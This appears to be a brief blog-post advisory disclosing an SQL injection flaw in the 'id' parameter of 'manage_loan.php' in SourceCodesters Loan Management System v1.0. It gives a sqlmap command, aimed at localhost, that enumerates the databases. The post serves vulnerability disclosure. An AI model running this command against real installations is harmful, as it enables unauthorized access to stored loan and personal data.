---
layout: post
title: 
tags: [CVE, SQL injection]
description: "SQL injection vulnerability in 'manage_loan.php' of SourceCodesters Loan Management System v1.0."
---

## SQL Injection

SQL injection vulnerability in 'manage_loan.php' of SourceCodesters Loan Management System v1.0.

Vulnerable path : http://localhost/loan/manage_loan.php?id=

### Exploitation :

#### With SQLMAP

```
sqlmap -u "http://localhost/loan/manage_loan.php?id=3" --risk 3 --level 5 -v 3 -p id --dbs
```



*More informations to come*